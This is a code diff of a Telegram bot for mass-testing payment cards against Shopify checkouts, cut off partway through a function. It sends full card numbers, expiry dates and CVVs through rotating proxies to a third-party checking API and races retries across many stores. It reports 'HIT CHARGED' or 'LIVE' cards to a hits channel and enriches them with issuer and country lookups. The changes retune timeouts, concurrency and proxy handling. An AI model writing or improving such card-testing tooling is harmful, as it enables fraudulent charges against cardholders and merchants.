@@ -2,8 +2,8 @@
 sh.py  v28  —  /sh single-card + /msh mass Shopify checker
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Framework : python-telegram-bot v21
-API       : https://goshopi.up.railway.app/shopii
-            GET ?site=https://DOMAIN&cc=NUM|MM|YY|CVV&proxy=http://ip:port
+API       : https://shopicardx.up.railway.app/shopii
+            GET ?cc=NUM|MM|YY|CVV&site=https://DOMAIN&proxy=http://ip:port
             proxy = http://ip:port  (WITH http:// prefix)
 
 ROOT-CAUSE FIX:
@@ -34,13 +34,11 @@ EXPORTS:
 from __future__ import annotations
 
 import asyncio
-import concurrent.futures
 import json as _json
 import logging
 import random
 import re
 import string
-import threading
 import time
 from datetime import datetime
 from html import escape
@@ -61,7 +59,7 @@ from config import (
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # CONSTANTS
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-API_URL       = "https://goshopi.up.railway.app/shopii"
+API_URL       = "https://shopicardx.up.railway.app/shopii"
 BOT_CHANNEL   = CHANNEL_LINK
 DEV_LINK_HTML = f'<a href="{BOT_CHANNEL}">{BOT_NAME}</a>'
 
@@ -78,12 +76,13 @@ MY_CHANNEL_LINK     = "https://t.me/Batcardchk"                    # main channe
 LOGS_CHANNEL_LINK   = "https://t.me/+BXmeotREVhllODFk"             # hits log channel
 
 SH_COOLDOWN    = 25
-SITE_RETRIES      = 5    # max site attempts per card  (tuned for speed)
-SITE_TIMEOUT      = 90   # seconds — server-side timeout is 120s; give it 90s
-MAX_CONCURRENT    = 300  # cards checked in parallel
-CARD_STAGGER      = 0.002 # stagger between card launches (seconds)
-SITE_BATCH        = 15   # sites raced in parallel within each retry round
-CONSEC_TIMEOUT_MAX = 5   # abort after 5 consecutive timeouts (dead proxies)
+SITE_RETRIES      = 80   # max site attempts per card
+SITE_TIMEOUT      = 20   # seconds per API call — generous for slow proxies
+MAX_CONCURRENT    = 15   # cards checked in parallel
+CARD_STAGGER      = 0.3  # stagger between card launches (seconds)
+SITE_BATCH        = 3    # sites raced in parallel within each retry round
+CONSEC_TIMEOUT_MAX = 45  # abort card after 45 consecutive timeouts
+                         # (15 rounds × 3 × 20s = 300s max before giving up)
 BUTTON_LOCK    = 30
 
 _CB_RESULT = "mshr"
@@ -176,36 +175,6 @@ def get_random_charged_emoji() -> str:
 def get_random_live_emoji() -> str:
     """Random premium emoji for LIVE / TDS hits — same pool as mst.py."""
     return random.choice(LIVE_EMOJI_IDS)
-
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# THREAD POOL  — one thread per concurrent mass session (msh.py pattern)
-# Each session gets its own event loop so it can’t block the bot’s main loop.
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-_USER_THREAD_POOL = concurrent.futures.ThreadPoolExecutor(
-    max_workers=60,
-    thread_name_prefix="sh_msh_sess",
-)
-_MAIN_LOOP: Optional[asyncio.AbstractEventLoop] = None
-_MAIN_LOOP_LOCK = threading.Lock()
-
-
-def _set_main_loop(loop: asyncio.AbstractEventLoop) -> None:
-    """Capture the bot’s main event loop once so _fire() can use it."""
-    global _MAIN_LOOP
-    with _MAIN_LOOP_LOCK:
-        if _MAIN_LOOP is None:
-            _MAIN_LOOP = loop
-
-
-def _fire(coro) -> None:
-    """Schedule a coroutine on the main bot loop — fire and forget, never blocks."""
-    loop = _MAIN_LOOP
-    if loop and not loop.is_closed():
-        try:
-            asyncio.run_coroutine_threadsafe(coro, loop)
-        except Exception as exc:
-            logging.warning(f"[FIRE] could not schedule coro: {exc}")
 
 
 def get_plan_emoji_id(plan_name: str) -> str:
@@ -1391,14 +1360,14 @@ def _proxy_url(proxy: Optional[str]) -> Optional[str]:
 
 async def _call_api(card: str, site: str, proxy: Optional[str],
                     timeout: float = SITE_TIMEOUT) -> tuple:
-    # sitechk.py-style API: ?site=URL&cc=CARD&proxy=PROXY  (site first)
+    # New API: ?cc=NUM|MM|YY|CVV&site=https://DOMAIN&proxy=http://ip:port
     site_clean = _strip_scheme(site)          # remove any existing scheme first
-    site_url   = f"https://{site_clean}"      # add https:// as API requires
+    site_url   = f"https://{site_clean}"      # add https:// as new API requires
     px         = _proxy_url(proxy)
-    url = (f"{API_URL}?site={site_url}&cc={card}&proxy={px}"
-           if px else f"{API_URL}?site={site_url}&cc={card}")
-    # connect=8 — enough for proxy handshake; sock_read covers full API wait
-    _to  = aiohttp.ClientTimeout(total=timeout, connect=8, sock_read=timeout)
+    url = (f"{API_URL}?cc={card}&site={site_url}&proxy={px}"
+           if px else f"{API_URL}?cc={card}&site={site_url}")
+    # connect=5 so hung proxies fail fast while still giving real sites room
+    _to  = aiohttp.ClientTimeout(total=timeout, connect=5, sock_read=timeout)
     try:
         async with aiohttp.ClientSession(timeout=_to) as session:
             async with session.get(url, ssl=False) as r:
@@ -1427,20 +1396,14 @@ async def _call_api(card: str, site: str, proxy: Optional[str],
                     500: "site error! status: 500",
                     502: "site error! status: 500",
                     503: "site error! status: 500",
-                    504: "proxy_timeout",  # gateway timeout = proxy issue
+                    504: "timeout",
                 }
-                return (_emap.get(http_st, f"site error! status: {http_st}"),
+                return (_emap.get(http_st, f"HTTP Error {http_st}"),
                         "Shopify Payments", "0.00", "USD", http_st)
     except asyncio.TimeoutError:
-        # Proxy is the bottleneck — signal caller to rotate, NOT skip site
-        return ("proxy_timeout", "Shopify Payments", "0.00", "USD", None)
+        return ("timeout", "Shopify Payments", "0.00", "USD", None)
     except asyncio.CancelledError:
         raise
-    except aiohttp.ClientConnectorError as e:
-        err = str(e).lower()
-        if "proxy" in err or "tunnel" in err or "connect" in err:
-            return ("proxy_error", "Shopify Payments", "0.00", "USD", None)
-        return (f"connection error: {str(e)[:60]}", "Shopify Payments", "0.00", "USD", None)
     except Exception as e:
         return (f"connection error: {str(e)[:60]}", "Shopify Payments", "0.00", "USD", None)
 
@@ -1487,27 +1450,15 @@ async def _check_card_with_retry(
     attempt         = 0   # total slots consumed
 
     # ── helpers ───────────────────────────────────────────────────────
-    _bad_px: set = set()   # proxies that timed out — rotated out per sitechk.py
-
-    def _pick_proxy() -> Optional[str]:
-        """Pick a proxy not in _bad_px; reset blacklist when all are bad."""
-        if not px_pool:
-            return None
-        avail = [p for p in px_pool if p not in _bad_px]
-        if not avail:        # all proxies exhausted — reset and try again
-            _bad_px.clear()
-            avail = px_pool
-        return random.choice(avail)
-
     async def _try_one(site: str, proxy: Optional[str]):
-        """Returns (site, proxy_used, result_tuple) — proxy tracked for blacklist."""
+        """Wrap _call_api so exceptions become an error-tuple instead of raising."""
         try:
-            return site, proxy, await _call_api(card, site, proxy, timeout=site_timeout)
+            return site, await _call_api(card, site, proxy, timeout=site_timeout)
         except asyncio.CancelledError:
             raise
         except Exception as e:
-            return site, proxy, (f"connection error: {str(e)[:60]}",
-                                 "Shopify Payments", "0.00", "USD", None)
+            return site, (f"connection error: {str(e)[:60]}",
+                          "Shopify Payments", "0.00", "USD", None)
 
     def _pick_site() -> Optional[str]:
         nonlocal pool
@@ -1545,17 +1496,19 @@ async def _check_card_with_retry(
 
         # Race all sites in the batch simultaneously
         tasks = [
-            asyncio.ensure_future(_try_one(s, _pick_proxy()))
+            asyncio.ensure_future(
+                _try_one(s, random.choice(px_pool) if px_pool else None)
+            )
             for s in batch
         ]
 
-        winner         = None
+        winner        = None
         batch_timeouts = 0
 
         try:
             for fut in asyncio.as_completed(tasks):
                 try:
-                    site, px_used, (resp, gw, price, currency, http_st) = await fut
+                    site, (resp, gw, price, currency, http_st) = await fut
                 except asyncio.CancelledError:
                     raise
                 except Exception:
@@ -1565,18 +1518,14 @@ async def _check_card_with_retry(
                 logging.info(f"[API] {card[:6]}** #{attempt}/{max_sites} "
                              f"site={site} → {resp!r}")
 
-                # ── Proxy timeout / error — rotate proxy, keep the site slot ──
-                # The SITE is fine; the PROXY is the bottleneck.
-                # Mark proxy bad, refund the attempt, re-queue the site.
-                if resp in ("proxy_timeout", "proxy_error"):
-                    if px_used:
-                        _bad_px.add(px_used)
-                    attempt    -= 1        # refund slot — site not consumed
-                    tried.discard(site)    # allow retry with fresh proxy
-                    logging.debug(f"[PROXY] {card[:6]}** proxy rotated ({resp})")
+                # Timeout → mark dead, tally for early-exit
+                if resp == "timeout" or resp == "Timeout":
+                    batch_timeouts += 1
+                    local_dead.add(site)
+                    last_resp = resp
                     continue
 
-                # HTTP-level error (non-proxy)
+                # HTTP-level error
                 if http_st and http_st not in (200,):
                     local_dead.add(site)
                     last_resp = f"HTTP {http_st}"
@@ -1599,7 +1548,6 @@ async def _check_card_with_retry(
 
                 # RETRY / ERROR — site gave a non-bank response
                 local_dead.add(site)
-                batch_timeouts += 1
 
         except asyncio.CancelledError:
             for t in tasks: t.cancel()
@@ -1613,14 +1561,23 @@ async def _check_card_with_retry(
         if winner:
             return winner
 
-        # (proxy rotation handled above — no CONSEC_TIMEOUT_MAX early-exit needed)
+        # ── Early-exit on dead proxies ────────────────────────────────
+        if batch_timeouts == len(batch):
+            consec_timeouts += batch_timeouts
+        else:
+            consec_timeouts = 0   # a real response resets the counter
 
-    # ── All attempts exhausted — never expose raw internal error to user ────
-    display = last_resp if last_resp and last_resp not in (
-        "proxy_timeout", "proxy_error", "timeout", "Timeout", ""
-    ) else "Card Declined"
+        if consec_timeouts >= CONSEC_TIMEOUT_MAX:
+            logging.warning(
+                f"[SH] {card[:6]}** {consec_timeouts} consecutive timeouts "
+                f"({consec_timeouts * site_timeout:.0f}s wasted) — "
+                f"proxies likely dead, aborting early"
+            )
+            return "DEAD", "timeout", price, currency
+
+    # ── All attempts exhausted ────────────────────────────────────────
     logging.warning(f"[SH] {card[:6]}** exhausted {max_sites} sites  last={last_resp!r}")
-    return "DEAD", display, price, currency
+    return "DEAD", last_resp, price, currency
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -1961,205 +1918,118 @@ def _sid() -> str:
 # BIN LOOKUP
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 COUNTRY_FLAGS = {
-    # A
-    "AF":"🇦🇫","AX":"🇦🇽","AL":"🇦🇱","DZ":"🇩🇿","AS":"🇦🇸","AD":"🇦🇩","AO":"🇦🇴",
-    "AI":"🇦🇮","AQ":"🇦🇶","AG":"🇦🇬","AR":"🇦🇷","AM":"🇦🇲","AW":"🇦🇼","AU":"🇦🇺",
-    "AT":"🇦🇹","AZ":"🇦🇿",
-    # B
-    "BS":"🇧🇸","BH":"🇧🇭","BD":"🇧🇩","BB":"🇧🇧","BY":"🇧🇾","BE":"🇧🇪","BZ":"🇧🇿",
-    "BJ":"🇧🇯","BM":"🇧🇲","BT":"🇧🇹","BO":"🇧🇴","BQ":"🇧🇶","BA":"🇧🇦","BW":"🇧🇼",
-    "BV":"🇧🇻","BR":"🇧🇷","IO":"🇮🇴","BN":"🇧🇳","BG":"🇧🇬","BF":"🇧🇫","BI":"🇧🇮",
-    # C
-    "CV":"🇨🇻","KH":"🇰🇭","CM":"🇨🇲","CA":"🇨🇦","KY":"🇰🇾","CF":"🇨🇫","TD":"🇹🇩",
-    "CL":"🇨🇱","CN":"🇨🇳","CX":"🇨🇽","CC":"🇨🇨","CO":"🇨🇴","KM":"🇰🇲","CG":"🇨🇬",
-    "CD":"🇨🇩","CK":"🇨🇰","CR":"🇨🇷","CI":"🇨🇮","HR":"🇭🇷","CU":"🇨🇺","CW":"🇨🇼",
-    "CY":"🇨🇾","CZ":"🇨🇿",
-    # D
-    "DK":"🇩🇰","DJ":"🇩🇯","DM":"🇩🇲","DO":"🇩🇴",
-    # E
-    "EC":"🇪🇨","EG":"🇪🇬","SV":"🇸🇻","GQ":"🇬🇶","ER":"🇪🇷","EE":"🇪🇪","SZ":"🇸🇿",
-    "ET":"🇪🇹",
-    # F
-    "FK":"🇫🇰","FO":"🇫🇴","FJ":"🇫🇯","FI":"🇫🇮","FR":"🇫🇷","GF":"🇬🇫","PF":"🇵🇫",
-    "TF":"🇹🇫",
-    # G
-    "GA":"🇬🇦","GM":"🇬🇲","GE":"🇬🇪","DE":"🇩🇪","GH":"🇬🇭","GI":"🇬🇮","GR":"🇬🇷",
-    "GL":"🇬🇱","GD":"🇬🇩","GP":"🇬🇵","GU":"🇬🇺","GT":"🇬🇹","GG":"🇬🇬","GN":"🇬🇳",
-    "GW":"🇬🇼","GY":"🇬🇾",
-    # H
-    "HT":"🇭🇹","HM":"🇭🇲","VA":"🇻🇦","HN":"🇭🇳","HK":"🇭🇰","HU":"🇭🇺",
-    # I
-    "IS":"🇮🇸","IN":"🇮🇳","ID":"🇮🇩","IR":"🇮🇷","IQ":"🇮🇶","IE":"🇮🇪","IM":"🇮🇲",
-    "IL":"🇮🇱","IT":"🇮🇹",
-    # J
-    "JM":"🇯🇲","JP":"🇯🇵","JE":"🇯🇪","JO":"🇯🇴",
-    # K
-    "KZ":"🇰🇿","KE":"🇰🇪","KI":"🇰🇮","KP":"🇰🇵","KR":"🇰🇷","KW":"🇰🇼","KG":"🇰🇬",
-    # L
-    "LA":"🇱🇦","LV":"🇱🇻","LB":"🇱🇧","LS":"🇱🇸","LR":"🇱🇷","LY":"🇱🇾","LI":"🇱🇮",
-    "LT":"🇱🇹","LU":"🇱🇺",
-    # M
-    "MO":"🇲🇴","MG":"🇲🇬","MW":"🇲🇼","MY":"🇲🇾","MV":"🇲🇻","ML":"🇲🇱","MT":"🇲🇹",
-    "MH":"🇲🇭","MQ":"🇲🇶","MR":"🇲🇷","MU":"🇲🇺","YT":"🇾🇹","MX":"🇲🇽","FM":"🇫🇲",
-    "MD":"🇲🇩","MC":"🇲🇨","MN":"🇲🇳","ME":"🇲🇪","MS":"🇲🇸","MA":"🇲🇦","MZ":"🇲🇿",
-    "MM":"🇲🇲",
-    # N
-    "NA":"🇳🇦","NR":"🇳🇷","NP":"🇳🇵","NL":"🇳🇱","NC":"🇳🇨","NZ":"🇳🇿","NI":"🇳🇮",
-    "NE":"🇳🇪","NG":"🇳🇬","NU":"🇳🇺","NF":"🇳🇫","MK":"🇲🇰","MP":"🇲🇵","NO":"🇳🇴",
-    # O
-    "OM":"🇴🇲",
-    # P
-    "PK":"🇵🇰","PW":"🇵🇼","PS":"🇵🇸","PA":"🇵🇦","PG":"🇵🇬","PY":"🇵🇾","PE":"🇵🇪",
-    "PH":"🇵🇭","PN":"🇵🇳","PL":"🇵🇱","PT":"🇵🇹","PR":"🇵🇷",
-    # Q
-    "QA":"🇶🇦",
-    # R
-    "RE":"🇷🇪","RO":"🇷🇴","RU":"🇷🇺","RW":"🇷🇼",
-    # S
-    "BL":"🇧🇱","SH":"🇸🇭","KN":"🇰🇳","LC":"🇱🇨","MF":"🇲🇫","PM":"🇵🇲","VC":"🇻🇨",
-    "WS":"🇼🇸","SM":"🇸🇲","ST":"🇸🇹","SA":"🇸🇦","SN":"🇸🇳","RS":"🇷🇸","SC":"🇸🇨",
-    "SL":"🇸🇱","SG":"🇸🇬","SX":"🇸🇽","SK":"🇸🇰","SI":"🇸🇮","SB":"🇸🇧","SO":"🇸🇴",
-    "ZA":"🇿🇦","GS":"🇬🇸","SS":"🇸🇸","ES":"🇪🇸","LK":"🇱🇰","SD":"🇸🇩","SR":"🇸🇷",
-    "SJ":"🇸🇯","SE":"🇸🇪","CH":"🇨🇭","SY":"🇸🇾",
-    # T
-    "TW":"🇹🇼","TJ":"🇹🇯","TZ":"🇹🇿","TH":"🇹🇭","TL":"🇹🇱","TG":"🇹🇬","TK":"🇹🇰",
-    "TO":"🇹🇴","TT":"🇹🇹","TN":"🇹🇳","TR":"🇹🇷","TM":"🇹🇲","TC":"🇹🇨","TV":"🇹🇻",
-    # U
-    "UG":"🇺🇬","UA":"🇺🇦","AE":"🇦🇪","GB":"🇬🇧","UM":"🇺🇲","US":"🇺🇸","UY":"🇺🇾",
-    "UZ":"🇺🇿",
-    # V
-    "VU":"🇻🇺","VE":"🇻🇪","VN":"🇻🇳","VG":"🇻🇬","VI":"🇻🇮",
-    # W
-    "WF":"🇼🇫","EH":"🇪🇭",
-    # X / Y / Z
-    "YE":"🇾🇪","ZM":"🇿🇲","ZW":"🇿🇼",
+    "US":"🇺🇸","GB":"🇬🇧","CA":"🇨🇦","AU":"🇦🇺","DE":"🇩🇪","FR":"🇫🇷",
+    "IN":"🇮🇳","BR":"🇧🇷","MX":"🇲🇽","JP":"🇯🇵","CN":"🇨🇳","RU":"🇷🇺",
+    "IT":"🇮🇹","ES":"🇪🇸","NL":"🇳🇱","SE":"🇸🇪","NG":"🇳🇬","ZA":"🇿🇦",
+    "EG":"🇪🇬","PK":"🇵🇰","SG":"🇸🇬","MY":"🇲🇾","ID":"🇮🇩","TH":"🇹🇭",
+    "PH":"🇵🇭","VN":"🇻🇳","AE":"🇦🇪","SA":"🇸🇦","TR":"🇹🇷","PL":"🇵🇱",
+    "UA":"🇺🇦","AR":"🇦🇷","CO":"🇨🇴","CL":"🇨🇱","NZ":"🇳🇿","HK":"🇭🇰",
+    "TW":"🇹🇼","KR":"🇰🇷","IL":"🇮🇱","CH":"🇨🇭","BE":"🇧🇪","AT":"🇦🇹",
+    "PT":"🇵🇹","GR":"🇬🇷","CZ":"🇨🇿","HU":"🇭🇺","RO":"🇷🇴","FI":"🇫🇮",
+    "DK":"🇩🇰","NO":"🇳🇴","IE":"🇮🇪",
 }
 
 
 async def _fetch_bin_direct(bin6: str) -> dict:
-    """Query all BIN sources IN PARALLEL; return first usable result.
-
-    Bug-fixes vs the old sequential version:
-      • bins.antipublic.cc added as source 0 — fastest, most reliable
-      • handyapi: was reading "Issuer" but real key is "Bank" — fixed
-      • validation: also accepts country_code alone (some APIs omit full name)
-      • parallel execution: all 6 sources fire simultaneously; the outer
-        wait_for can no longer time-out before source 2+ even starts
-    """
-    _bad = {"", "N/A", "NONE", "UNKNOWN", "NULL", "None", "none"}
-
-    async def _try(url: str, hdrs: dict, parse) -> dict:
-        try:
-            # 3s total / 2s connect — all 6 sources complete in ~3s
-            to = aiohttp.ClientTimeout(total=3, connect=2)
-            async with aiohttp.ClientSession(
-                timeout=to, headers={"User-Agent": "Mozilla/5.0"}
-            ) as s:
-                async with s.get(url, headers=hdrs, ssl=False) as r:
-                    if r.status != 200:
-                        return {}
-                    try:
-                        data = await r.json(content_type=None)
-                    except Exception:
-                        return {}
-                    info = parse(data)
-                    scheme_ok  = bool((info.get("scheme")       or "").strip().upper() not in _bad)
-                    bank_ok    = bool((info.get("bank")         or "").strip().upper() not in _bad)
-                    country_ok = bool((info.get("country")      or "").strip().upper() not in _bad)
-                    cc_ok      = bool((info.get("country_code") or "").strip().upper() not in _bad)
-                    # Scheme alone is valid — better to show VISA than nothing
-                    if not scheme_ok:
-                        return {}
-                    cc = (info.get("country_code") or "").upper()[:2]
-                    info["country_emoji"] = COUNTRY_FLAGS.get(cc, "")
-                    return info
-        except Exception:
-            return {}
-
     sources = [
-        # ── 0. bins.antipublic.cc  (fastest, most reliable) ───────────────
-        (
-            f"https://bins.antipublic.cc/bins/{bin6}", {},
-            lambda d: {
-                "scheme":       (d.get("vendor") or d.get("scheme") or d.get("brand") or "").upper(),
-                "bank":         d.get("bank", ""),
-                "country":      d.get("country_name", d.get("country", "")),
-                "country_code": d.get("country_code", ""),
-            },
-        ),
-        # ── 1. handyapi  (fixed: real key is "Bank", not "Issuer") ────────
-        (
-            f"https://data.handyapi.com/bin/{bin6}", {},
-            lambda d: {
+        {
+            "url":   f"https://data.handyapi.com/bin/{bin6}",
+            "hdrs":  {},
+            # Real response keys: "Scheme", "Issuer", "Country": {"A2":..,"Name":..}
+            "parse": lambda d: {
                 "scheme":       (d.get("Scheme") or d.get("scheme") or d.get("Type") or "").upper(),
-                "bank":         (d.get("Bank") or d.get("Issuer") or d.get("issuer") or d.get("bank") or ""),
+                "bank":         d.get("Issuer") or d.get("issuer") or d.get("bank") or "",
                 "country":      (d.get("Country") or d.get("CountryInfo") or {}).get("Name", ""),
                 "country_code": (d.get("Country") or d.get("CountryInfo") or {}).get("A2", ""),
             },
-        ),
-        # ── 2. binlist.net ────────────────────────────────────────────────
-        (
-            f"https://lookup.binlist.net/{bin6}", {"Accept-Version": "3"},
-            lambda d: {
+        },
+        {
+            "url":   f"https://lookup.binlist.net/{bin6}",
+            "hdrs":  {"Accept-Version": "3"},
+            "parse": lambda d: {
                 "scheme":       (d.get("scheme") or d.get("brand") or "").upper(),
                 "bank":         (d.get("bank") or {}).get("name", ""),
                 "country":      (d.get("country") or {}).get("name", ""),
                 "country_code": (d.get("country") or {}).get("alpha2", ""),
             },
-        ),
-        # ── 3. binin.com ──────────────────────────────────────────────────
-        (
-            f"https://api.binin.com/bin/{bin6}", {},
-            lambda d: {
+        },
+        {
+            "url":   f"https://api.binin.com/bin/{bin6}",
+            "hdrs":  {},
+            "parse": lambda d: {
                 "scheme":       (d.get("brand") or d.get("scheme") or d.get("type") or "").upper(),
                 "bank":         d.get("bank", d.get("issuer", "")),
                 "country":      d.get("country", d.get("country_name", "")),
                 "country_code": d.get("country_code", d.get("iso2", "")),
             },
-        ),
-        # ── 4. handy.codes ────────────────────────────────────────────────
-        (
-            f"https://api.handy.codes/bin/{bin6}", {},
-            lambda d: {
+        },
+        {
+            "url":   f"https://api.handy.codes/bin/{bin6}",
+            "hdrs":  {},
+            "parse": lambda d: {
                 "scheme":       (d.get("scheme") or d.get("brand") or d.get("type") or "").upper(),
                 "bank":         d.get("bank", ""),
                 "country":      d.get("country", ""),
                 "country_code": d.get("country_code", d.get("iso", "")),
             },
-        ),
-        # ── 5. bincodes.com ───────────────────────────────────────────────
-        (
-            f"https://www.bincodes.com/api/bin/?hash=free&bin={bin6}", {},
-            lambda d: {
+        },
+        {
+            "url":   f"https://www.bincodes.com/api/bin/?hash=free&bin={bin6}",
+            "hdrs":  {},
+            "parse": lambda d: {
                 "scheme":       (d.get("card") or d.get("scheme") or "").upper(),
                 "bank":         d.get("bank", ""),
                 "country":      d.get("country", ""),
                 "country_code": d.get("country_code", ""),
             },
-        ),
+        },
     ]
-
-    # Fire all 6 simultaneously — take the first non-empty result
-    results = await asyncio.gather(
-        *[_try(url, hdrs, parse) for url, hdrs, parse in sources],
-        return_exceptions=True,
-    )
-    for r in results:
-        if isinstance(r, dict) and r:
-            return r
+    _to = aiohttp.ClientTimeout(total=10, connect=5)
+    for src in sources:
+        try:
+            async with aiohttp.ClientSession(
+                timeout=_to, headers={"User-Agent": "Mozilla/5.0"}
+            ) as s:
+                async with s.get(src["url"], headers=src["hdrs"], ssl=False) as r:
+                    if r.status != 200:
+                        continue
+                    try:
+                        data = await r.json(content_type=None)
+                    except Exception:
+                        continue
+                    info = src["parse"](data)
+                    # Require scheme AND at least one of bank/country to be non-empty.
+                    # A result with scheme but N/A bank + N/A country is useless — try next source.
+                    _bad = {"", "N/A", "NONE", "UNKNOWN", "NULL", "None", "none"}
+                    scheme_ok  = bool((info.get("scheme")  or "").strip().upper() not in _bad)
+                    bank_ok    = bool((info.get("bank")    or "").strip().upper() not in _bad)
+                    country_ok = bool((info.get("country") or "").strip().upper() not in _bad)
+                    if not scheme_ok or not (bank_ok or country_ok):
+                        continue
+                    cc = (info.get("country_code") or "").upper()[:2]
+                    # Build flag from alpha2 if not provided by the source
+                    if not cc and info.get("country"):
+                        cc = ""
+                    info["country_emoji"] = COUNTRY_FLAGS.get(cc, "")
+                    return info
+        except Exception:
+            continue
     return {}
 
 
 def _bin_empty(r: dict) -> bool:
-    """True if the result has no usable BIN data at all.
-    Relaxed: scheme alone (VISA / MASTERCARD / AMEX) is valid —
-    better to show 'VISA - N/A - N/A' than discard a partial result.
-    """
+    """True if the result has no usable BIN data (N/A, error, or missing)."""
     if not r or r.get("error"):
         return True
     bad = {"", "N/A", "NONE", "UNKNOWN", "NULL", "None", "none"}
-    scheme = str(r.get("scheme", "") or "").strip().upper()
-    return scheme in bad   # scheme alone is the minimum useful data
+    scheme  = str(r.get("scheme",  "") or "").strip().upper()
+    bank    = str(r.get("bank",    "") or "").strip().upper()
+    country = str(r.get("country", "") or "").strip().upper()
+    # Need scheme AND at least one of bank/country
+    scheme_ok  = scheme  not in bad
+    bank_ok    = bank    not in bad
+    country_ok = country not in bad
+    return not scheme_ok or not (bank_ok or country_ok)
 
 
 async def _bin_lookup(bin6: str) -> dict:
@@ -2169,7 +2039,7 @@ async def _bin_lookup(bin6: str) -> dict:
 
     # 1. Try multi-source direct lookup first (fastest, no rate limit)
     try:
-        result = await asyncio.wait_for(_fetch_bin_direct(bin6), timeout=14)
+        result = await asyncio.wait_for(_fetch_bin_direct(bin6), timeout=10)
     except Exception:
         result = {}
 
@@ -2221,9 +2091,9 @@ def _bin_str(bd: dict) -> str:
         return "N/A"
     scheme  = escape(_g("scheme", "brand", "card_scheme", "network").upper())
     bank    = escape(_g("bank", "bank_name", "issuer", "issuer_name"))
-    country = escape(_clean_country(_g("country", "country_name", "country_full")).upper())
+    country = escape(_clean_country(_g("country", "country_name", "country_full")))
     flag    = bd.get("country_emoji", "")
-    cstr    = f"{country}{flag}" if flag else country   # flag after: FRANCE🇫🇷
+    cstr    = f"{flag} {country}".strip() if flag else country
     return f"{scheme} - {bank} - {cstr}"
 
 
@@ -2240,9 +2110,9 @@ def _bin_str_plain(bd: dict) -> str:
         return "N/A"
     scheme  = _g("scheme", "brand", "card_scheme", "network").upper()
     bank    = _g("bank", "bank_name", "issuer", "issuer_name")
-    country = _clean_country(_g("country", "country_name", "country_full")).upper()
+    country = _clean_country(_g("country", "country_name", "country_full"))
     flag    = bd.get("country_emoji", "")
-    cstr    = f"{country}{flag}" if flag else country   # flag after: FRANCE🇫🇷
+    cstr    = f"{flag} {country}".strip() if flag else country
     return f"{scheme} - {bank} - {cstr}"
 
 
@@ -2277,24 +2147,26 @@ def build_result_msg(card, resp, verdict, bin_data, price, currency,
     ch_link   = f'<a href="{CHANNEL_LINK}">[❆]</a>'
     live_eid  = get_random_live_emoji()
 
-    plan_eid = _plan_eid(plan)
-
     if verdict == "CHARGED":
         status_line = (f'<b>{ch_link} HIT CHARGED '
                        f'<tg-emoji emoji-id="{PROG_CHARGED_EMOJI_ID}">💎</tg-emoji></b>')
-        gate_line   = f"Gate ➳ Shopify • {_fmt_price(price, currency)}"
+        gate_line   = f"Gate ➛ Shopify • {_fmt_price(price, currency)}"
+        resp_te     = f'<tg-emoji emoji-id="{PROG_CHARGED_EMOJI_ID}">💎</tg-emoji>'
     elif verdict == "TDS":
         status_line = (f'<b>{ch_link} HIT LIVE [3DS] '
                        f'<tg-emoji emoji-id="{live_eid}">✅</tg-emoji></b>')
-        gate_line   = "Gate ➳ Shopify"
+        gate_line   = "Gate ➛ Shopify"
+        resp_te     = f'<tg-emoji emoji-id="{PROG_LIVE_EMOJI_ID}">✅</tg-emoji>'
     elif verdict == "LIVE":
         status_line = (f'<b>{ch_link} HIT LIVE '
                        f'<tg-emoji emoji-id="{live_eid}">✅</tg-emoji></b>')
-        gate_line   = "Gate ➳ Shopify"
+        gate_line   = "Gate ➛ Shopify"
+        resp_te     = f'<tg-emoji emoji-id="{PROG_LIVE_EMOJI_ID}">✅</tg-emoji>'
     else:
         status_line = (f'<b>{ch_link} DEAD DECLINED '
                        f'<tg-emoji emoji-id="{PROG_DEAD_EMOJI_ID}">❌</tg-emoji></b>')
-        gate_line   = "Gate ➳ Shopify"
+        gate_line   = "Gate ➛ Shopify"
+        resp_te     = f'<tg-emoji emoji-id="{PROG_DEAD_EMOJI_ID}">❌</tg-emoji>'
 
     return (
         f'{status_line}\n'
@@ -2303,13 +2175,13 @@ def build_result_msg(card, resp, verdict, bin_data, price, currency,
         f'<b>   ⤷ <code>{escape(card)}</code></b>\n'
         f'<b>{gate_line}</b>\n'
         f'<b>──────────</b>\n'
-        f'<b>Resp ➳ {safe_resp}</b>\n'
-        f'<b>Info ➳ {bin_s}</b>\n'
+        f'<b>{resp_te} Resp ➛ {safe_resp}</b>\n'
+        f'<b>Bin ➛ <code>{bin_s}</code></b>\n'
         f'<b>──────────</b>\n'
-        f'<b><tg-emoji emoji-id="{TIME_EMOJI_ID}">⏱</tg-emoji> ➳ {ts}</b>\n'
-        f'<b><tg-emoji emoji-id="{USER_EMOJI_ID}">👤</tg-emoji> ➳ {ulink} '
-        f'<tg-emoji emoji-id="{plan_eid}">⭐</tg-emoji></b>\n'
-        f'<b><tg-emoji emoji-id="{DEV_EMOJI_ID}">⚡</tg-emoji> ➳ {DEV_LINK_HTML} '
+        f'<b><tg-emoji emoji-id="{TIME_EMOJI_ID}">⏱</tg-emoji> ➛ {ts}</b>\n'
+        f'<b><tg-emoji emoji-id="{USER_EMOJI_ID}">👤</tg-emoji> ➛ {ulink} '
+        f'<tg-emoji emoji-id="{PRO_EMOJI_ID}">⭐</tg-emoji></b>\n'
+        f'<b><tg-emoji emoji-id="{DEV_EMOJI_ID}">⚡</tg-emoji> ➛ {DEV_LINK_HTML} '
         f'<tg-emoji emoji-id="{PRO_EMOJI_ID}">⭐</tg-emoji></b>'
     )
 
@@ -2323,22 +2195,20 @@ _build_result_msg = build_result_msg
 # as aiogram mst.py so <tg-emoji> renders animated.
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 def _progress_text(sess: dict) -> str:
-    ts       = _fmt_time(time.time() - sess["start_time"])
